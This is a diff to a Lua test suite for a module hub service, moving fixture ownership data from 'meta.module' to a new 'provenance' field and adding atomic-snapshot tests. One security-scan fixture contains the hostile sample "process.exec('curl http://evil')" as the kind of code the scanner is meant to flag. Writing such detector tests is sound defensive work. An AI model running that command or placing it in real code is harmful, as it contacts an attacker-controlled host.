@@ -1,6 +1,7 @@
 local test = require("test")
 local hub = require("hub_service")
 local planner = require("planner")
+local provenance = require("provenance")
 local security_scan = require("security_scan")
 local hub_dependencies_tool = require("hub_dependencies_tool")
 local hub_migrations_tool = require("hub_migrations_tool")
@@ -32,16 +33,36 @@ local function fake_managed_governance(namespaces)
     }
 end
 
+-- Fixture entries declare ownership in a `provenance` field, mirroring
+-- registry-owned provenance. They deliberately carry no meta.module: the runtime
+-- stopped stamping it, and a `meta.module` query raises here so no consumer can
+-- silently fall back to the old model.
 local function fake_registry(entries)
     local by_id = {}
     for _, entry in ipairs(entries or {}) do by_id[entry.id] = entry end
+
+    local function entry_provenance(entry)
+        if not entry then return nil end
+        local p = entry.provenance or {}
+        return {
+            module = p.module or "",
+            version = p.version or "",
+            digest = p.digest or "",
+            root = p.root == true,
+        }
+    end
+
+    local function provenance_of(id)
+        return entry_provenance(by_id[id])
+    end
 
     local function matches(entry, criteria)
         for key, expected in pairs(criteria or {}) do
             if key == ".kind" then
                 if entry.kind ~= expected then return false end
-            elseif key == "meta.module" then
-                if not entry.meta or entry.meta.module ~= expected then return false end
+            elseif key == "meta.module" or key == "meta.module_version" then
+                error("registry no longer stamps " .. key ..
+                    "; resolve ownership through registry snapshot state")
             elseif key == "meta.type" then
                 if not entry.meta or entry.meta.type ~= expected then return false end
             else
@@ -61,6 +82,27 @@ local function fake_registry(entries)
         end,
         get = function(id)
             return by_id[id], nil
+        end,
+        -- One consistent capture: entries and their provenance are taken
+        -- together, exactly as registry.snapshot() serves them.
+        snapshot = function()
+            local captured = {}
+            local captured_provenance = {}
+            for _, entry in ipairs(entries or {}) do
+                table.insert(captured, entry)
+                captured_provenance[entry.id] = entry_provenance(entry)
+            end
+            return {
+                entries = function() return captured, nil end,
+                get = function(_, id) return by_id[id], nil end,
+                version = function() return "test-version" end,
+                state = function()
+                    return {
+                        entries = captured,
+                        provenance = captured_provenance,
+                    }, nil
+                end,
+            }, nil
         end,
     }
 end
@@ -291,7 +333,7 @@ end
 
 -- Builds the registry entries an installed module contributes: a definition
 -- marker (so the module reads as installed) plus one module-owned ns.dependency
--- per child component (meta.module == module, data.component == child). This is
+-- per child component (provenance owner == module, data.component == child). This is
 -- the installed dependency-edge shape the closure resolver walks.
 local function installed_module(module, children, version)
     version = version or "1.0.0"
@@ -299,7 +341,7 @@ local function installed_module(module, children, version)
         {
             id = module .. ":__def",
             kind = "ns.definition",
-            meta = { module = module, module_version = version },
+            meta = {}, provenance = { module = module, version = version },
             data = {},
         },
     }
@@ -307,7 +349,7 @@ local function installed_module(module, children, version)
         table.insert(entries, {
             id = module .. ":dep." .. child,
             kind = "ns.dependency",
-            meta = { module = module, module_version = version },
+            meta = {}, provenance = { module = module, version = version },
             data = { component = child, version = ">=v0.0.0" },
         })
     end
@@ -317,7 +359,13 @@ end
 -- A deployment root ns.dependency entry (meta:{}, no stored resolved graph),
 -- as source-declared baseline roots appear in a brownfield app.
 local function root_dep(id, component)
-    return { id = id, kind = "ns.dependency", meta = {}, data = { component = component, version = ">=v0.0.0" } }
+    return {
+        id = id,
+        kind = "ns.dependency",
+        meta = {},
+        provenance = { root = true },
+        data = { component = component, version = ">=v0.0.0" },
+    }
 end
 
 local function concat_entries(...)
@@ -444,7 +492,7 @@ local function security_scan_catalog()
                         {
                             id = "acme.clean:handler",
                             kind = "function.lua",
-                            meta = { module = "acme/clean", module_version = "v1.0.0" },
+                            meta = {}, provenance = { module = "acme/clean", version = "v1.0.0" },
                             data = { method = "handler", source = "return { handler = function() return true end }" },
                         },
                     },
@@ -461,7 +509,7 @@ local function security_scan_catalog()
                         {
                             id = "acme.risky:run",
                             kind = "function.lua",
-                            meta = { module = "acme/risky", module_version = "v1.0.0" },
+                            meta = {}, provenance = { module = "acme/risky", version = "v1.0.0" },
                             data = { source = "local process = require('process'); process.exec('curl http://evil')" },
                         },
                     },
@@ -481,7 +529,7 @@ local function security_scan_catalog()
                         {
                             id = "acme.app:handler",
                             kind = "function.lua",
-                            meta = { module = "acme/app", module_version = "v1.0.0" },
+                            meta = {}, provenance = { module = "acme/app", version = "v1.0.0" },
                             data = { source = "return { handler = function() return 'ok' end }" },
                         },
                     },
@@ -583,6 +631,7 @@ local function fixture_entries()
         {
             id = "app.deps:foo",
             kind = "ns.dependency",
+            provenance = { root = true },
             meta = {
                 hub = {
                     resolved_modules = {
@@ -595,19 +644,18 @@ local function fixture_entries()
         {
             id = "wippy.foo:lib",
             kind = "library.lua",
-            meta = { module = "wippy/foo", module_version = "v1.2.3" },
+            meta = {}, provenance = { module = "wippy/foo", version = "v1.2.3" },
             data = {},
         },
         {
             id = "wippy.foo.migrations:001",
             kind = "function.lua",
             meta = {
-                module = "wippy/foo",
-                module_version = "v1.2.3",
                 type = "migration",
                 target_db = "app:db",
                 timestamp = "2026-01-01T00:00:00Z",
             },
+            provenance = { module = "wippy/foo", version = "v1.2.3" },
             data = { method = "migrate" },
         },
     }
@@ -813,6 +861,70 @@ local function define_tests()
         end)
 
         describe("inventory", function()
+            it("captures one atomic state per operation and refreshes for the next", function()
+                local entries = installed_module("wippy/first", {}, "1.0.0")
+                local reg = fake_registry(entries)
+                local state_reads = 0
+                local snapshot = reg.snapshot
+                reg.snapshot = function()
+                    local snap, snap_err = snapshot()
+                    if snap then
+                        local state = snap.state
+                        snap.state = function(...)
+                            state_reads = state_reads + 1
+                            return state(...)
+                        end
+                    end
+                    return snap, snap_err
+                end
+
+                local first = provenance.new(reg) :: any
+                local first_modules, first_err = first:module_versions()
+                test.is_nil(first_err)
+                test.eq(first_modules["wippy/first"], "1.0.0")
+                test.eq(state_reads, 1)
+                -- Reusing the operation-local index does not mix versions.
+                local same_modules, same_err = first:module_versions()
+                test.is_nil(same_err)
+                test.eq(same_modules["wippy/first"], "1.0.0")
+                test.eq(state_reads, 1)
+
+                for _, entry in ipairs(installed_module("wippy/second", {}, "2.0.0")) do
+                    table.insert(entries, entry)
+                end
+                local next_operation = provenance.new(reg) :: any
+                local next_modules, next_err = next_operation:module_versions()
+                test.is_nil(next_err)
+                test.eq(next_modules["wippy/first"], "1.0.0")
+                test.eq(next_modules["wippy/second"], "2.0.0")
+                test.eq(state_reads, 2)
+            end)
+
+            it("fails closed when atomic provenance state is unavailable or incomplete", function()
+                local unavailable = provenance.new({
+                    snapshot = function() return { entries = function() return {}, nil end }, nil end,
+                }) :: any
+                local unavailable_modules, unavailable_err = unavailable:module_versions()
+                test.is_nil(unavailable_modules)
+                test.contains(tostring(unavailable_err), "does not serve atomic provenance state")
+
+                local incomplete = provenance.new({
+                    snapshot = function()
+                        return {
+                            state = function()
+                                return {
+                                    entries = { { id = "app:unowned", kind = "library.lua" } },
+                                    provenance = {},
+                                }, nil
+                            end,
+                        }, nil
+                    end,
+                }) :: any
+                local incomplete_modules, incomplete_err = incomplete:module_versions()
+                test.is_nil(incomplete_modules)
+                test.contains(tostring(incomplete_err), "has no provenance for app:unowned")
+            end)
+
             it("lists dependency entries with module entry and migration status", function()
                 local svc = hub.new({
                     registry = fake_registry(fixture_entries()),
@@ -851,9 +963,11 @@ local function define_tests()
             it("does not list module-owned package dependencies as installed dependencies", function()
                 local entries = fixture_entries()
                 table.insert(entries, {
-                    id = "wippy.foo:dependency.shared",
+                    -- Deliberately place the transitive edge inside a managed
+                    -- namespace: namespace and payload cannot forge root status.
+                    id = "app.deps:shared_transitive",
                     kind = "ns.dependency",
-                    meta = { module = "wippy/foo", module_version = "1.2.3" },
+                    meta = {}, provenance = { module = "wippy/foo", version = "1.2.3" },
                     data = { component = "wippy/shared", version = ">=1.0.0" },
                 })
                 local svc = hub.new({
@@ -873,8 +987,7 @@ local function define_tests()
                 local entries = fixture_entries()
                 for _, entry in ipairs(entries) do
                     if entry.id == "app.deps:foo" then
-                        entry.meta.module = "acme/application"
-                        entry.meta.module_version = "1.0.0"
+                        entry.provenance = { module = "acme/application", version = "1.0.0", root = true }
                     end
                 end
                 local svc = hub.new({
@@ -896,7 +1009,7 @@ local function define_tests()
                 table.insert(entries, {
                     id = "wippy.foo:dependency.shared",
                     kind = "ns.dependency",
-                    meta = { module = "wippy/foo", module_version = "1.2.3" },
+                    meta = {}, provenance = { module = "wippy/foo", version = "1.2.3" },
                     data = { component = "wippy/shared", version = ">=1.0.0" },
                 })
                 local svc = hub.new({
@@ -1017,31 +1130,17 @@ local function define_tests()
             end)
 
             it("returns a stable count on repeated calls without mutating registry slices", function()
-                -- A registry that hands back the SAME backing slice per criteria on
-                -- every call, so any in-place reader mutation corrupts later reads.
-                local base = fake_registry(concat_entries(
+                -- The snapshot hands back its captured backing slice, so any
+                -- in-place reader mutation corrupts later reads.
+                local entries = concat_entries(
                     { root_dep("app.deps:beta", "wippy/beta") },
                     { root_dep("app.deps:alpha", "wippy/alpha") },
                     installed_module("wippy/alpha", { "wippy/zeta", "wippy/aardvark" }),
                     installed_module("wippy/beta", {}),
                     installed_module("wippy/zeta", {}),
                     installed_module("wippy/aardvark", {})
-                ))
-                local cache = {}
-                local function key(criteria)
-                    local parts = {}
-                    for k, v in pairs(criteria or {}) do table.insert(parts, tostring(k) .. "=" .. tostring(v)) end
-                    table.sort(parts)
-                    return table.concat(parts, "&")
-                end
-                local reg = {
-                    find = function(criteria)
-                        local k = key(criteria)
-                        if cache[k] == nil then cache[k] = (base.find(criteria)) end
-                        return cache[k], nil
-                    end,
-                    get = base.get,
-                }
+                )
+                local reg = fake_registry(entries)
 
                 local svc = hub.new({ registry = reg, sql = fake_sql({}), planner = planner }) :: any
 
@@ -1054,11 +1153,10 @@ local function define_tests()
                 test.eq(second.count, first.count)
                 test.eq(second.module_count, first.module_count)
 
-                -- registry-owned slice keeps its insertion order: readers sort copies
-                local slice = cache["meta.module=wippy/alpha"]
-                if not slice then error("expected cached alpha module slice") end
-                test.eq(slice[1].id, "wippy/alpha:__def")
-                test.eq(slice[2].id, "wippy/alpha:dep.wippy/zeta")
+                -- Registry-owned slice keeps its insertion order: readers sort copies.
+                test.eq(entries[1].id, "app.deps:beta")
+                test.eq(entries[2].id, "app.deps:alpha")
+                test.eq(entries[3].id, "wippy/alpha:__def")
             end)
         end)
 
@@ -1524,7 +1622,7 @@ local function define_tests()
                     return svc, files, entries
                 end
 
-                local gov_state = { current_version = 50 }
+                local gov_state = ({ current_version = 50 }) :: any
                 local svc, files, entries = make_svc(gov_state)
                 local out, uninstall_err = svc:uninstall({
                     component = "kickside/knowledge",
@@ -1884,7 +1982,7 @@ local function define_tests()
                                             {
                                                 id = "acme.large:handler",
                                                 kind = "function.lua",
-                                                meta = { module = "acme/large", module_version = "v1.0.0" },
+                                                meta = {}, provenance = { module = "acme/large", version = "v1.0.0" },
                                                 data = { source = long_source },
                                             },
                                         },
@@ -1969,7 +2067,7 @@ local function define_tests()
                                         {
                                             id = "wippy.actor:run",
                                             kind = "function.lua",
-                                            meta = { module = "wippy/actor", module_version = "v0.4.0" },
+                                            meta = {}, provenance = { module = "wippy/actor", version = "v0.4.0" },
                                             data = { source = "return { handler = function() return true end }" },
                                         },
                                     },
@@ -2040,6 +2138,7 @@ local function define_tests()
                         {
                             id = "app.plugins:dummy_runtime",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "wippy/dummy", version = "v0.9.0" },
                         },
@@ -2126,7 +2225,7 @@ local function define_tests()
             end)
 
             it("matches a declared db.sql requirement against the concrete database kinds", function()
-                local function db_plan(supplied)
+                local function db_plan(supplied: string?)
                     local args: { [string]: any } = { component = "acme/store", version = "v1.0.0" }
                     if supplied then
                         args.parameters = { { name = "acme.store:target_db", value = supplied } }
@@ -2211,18 +2310,21 @@ local function define_tests()
                         {
                             id = "app.plugins:alpha",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "acme/alpha", version = "v1.0.0" },
                         },
                         {
                             id = "app.plugins:beta",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "acme/beta", version = "v1.0.0" },
                         },
                         {
                             id = "app.deps:older",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "acme/older", version = "v1.0.0" },
                         },
@@ -2277,13 +2379,13 @@ local function define_tests()
                     {
                         id = "acme.parent:__def",
                         kind = "ns.definition",
-                        meta = { module = "acme/parent", module_version = "1.0.0" },
+                        meta = {}, provenance = { module = "acme/parent", version = "1.0.0" },
                         data = {},
                     },
                     {
                         id = "acme.parent:dep.acme.shared",
                         kind = "ns.dependency",
-                        meta = { module = "acme/parent", module_version = "1.0.0" },
+                        meta = {}, provenance = { module = "acme/parent", version = "1.0.0" },
                         data = { component = "acme/shared", version = "v1.2.3" },
                     },
                 }, installed_module("acme/shared", {}))
@@ -3373,10 +3475,12 @@ local function define_tests()
 
             it("does not re-plan parameters for an installed package-owned dependency", function()
                 local parent_entries = installed_module("acme/parent", { "wippy/bootloader" })
-                parent_entries[2].data.parameters = {
+                local parent_dependency = parent_entries[2]
+                if not parent_dependency then error("installed module fixture has no dependency entry") end
+                parent_dependency.data.parameters = {
                     { name = "wippy.bootloader:env_storage", value = "app.env:recorded" },
                 }
-                local recorded_parameters = parent_entries[2].data.parameters
+                local recorded_parameters = parent_dependency.data.parameters
                 local svc = planner.new({
                     catalog = planner_catalog(),
                     registry = fake_registry(concat_entries(
@@ -3421,6 +3525,7 @@ local function define_tests()
                         {
                             id = "app.deps:other",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "acme/other",
@@ -3467,6 +3572,7 @@ local function define_tests()
                         {
                             id = "app.deps:dummy_previous",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "wippy/dummy",
@@ -3513,6 +3619,7 @@ local function define_tests()
                         {
                             id = "app.deps:dummy_previous",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "wippy/dummy",
@@ -3560,7 +3667,7 @@ local function define_tests()
                         {
                             id = "acme.parent:dep.wippy.dummy",
                             kind = "ns.dependency",
-                            meta = { module = "acme/parent", module_version = "v1.0.0" },
+                            meta = {}, provenance = { module = "acme/parent", version = "v1.0.0" },
                             data = {
                                 component = "wippy/dummy",
                                 version = "v1.0.0",
@@ -3604,6 +3711,7 @@ local function define_tests()
                         {
                             id = "app.deps:profile",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "acme/application-profile",
@@ -3649,6 +3757,7 @@ local function define_tests()
                         {
                             id = "app.deps:dummy_a",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "acme/parameter_source_a",
@@ -3659,6 +3768,7 @@ local function define_tests()
                         {
                             id = "app.deps:dummy_b",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = {
                                 component = "acme/parameter_source_b",
@@ -4009,6 +4119,7 @@ local function define_tests()
                         {
                             id = "app.deps:component",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "kickside/component", version = "0.1.2" },
                         },
@@ -4054,6 +4165,7 @@ local function define_tests()
                         {
                             id = "app.deps:shared",
                             kind = "ns.dependency",
+                            provenance = { root = true },
                             meta = {},
                             data = { component = "acme/shared", version = "<v2.0.0" },
                         },
@@ -4130,6 +4242,7 @@ local function define_tests()
                             {
                                 id = "app.deps:component",
                                 kind = "ns.dependency",
+                                provenance = { root = true },
                                 meta = {},
                                 data = { component = "kickside/component", version = "^0.1.0" },
                             },
